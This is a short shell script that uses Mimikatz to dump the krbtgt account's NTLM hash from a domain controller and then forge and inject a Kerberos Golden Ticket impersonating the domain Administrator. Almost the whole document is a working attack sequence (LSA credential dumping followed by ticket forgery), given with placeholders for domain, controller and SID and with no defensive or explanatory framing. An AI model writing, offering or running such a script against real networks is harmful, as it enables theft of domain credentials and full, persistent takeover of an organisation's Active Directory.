#!/bin/bash

# Check if Mimikatz is present
if ! [ -x "$(command -v mimikatz)" ]; then
  echo "Error: Mimikatz is not installed." >&2
  exit 1
fi

# Define variables
DOMAIN_NAME="yourdomain.com"
KRBTGT_USER="krbtgt"
DC_NAME="yourDCname"
OUTPUT_DIR="/path/to/output"

# Extract krbtgt hash (requires administrative privileges)
mimikatz "privilege::debug" "lsadump::lsa /inject /name:$KRBTGT_USER" > "$OUTPUT_DIR/krbtgt_hash.txt"

# Extract necessary values from the output file
# This part depends on the output format of Mimikatz and may need adjustment
KRBTGT_HASH=$(grep -oP 'Hash NTLM: \K.*' "$OUTPUT_DIR/krbtgt_hash.txt")

# Create a Golden Ticket
mimikatz "kerberos::golden /user:Administrator /domain:$DOMAIN_NAME /sid:[DOMAIN_SID] /krbtgt:$KRBTGT_HASH /id:500 /ptt"

# The Golden Ticket is now in memory and can be used for accessing resources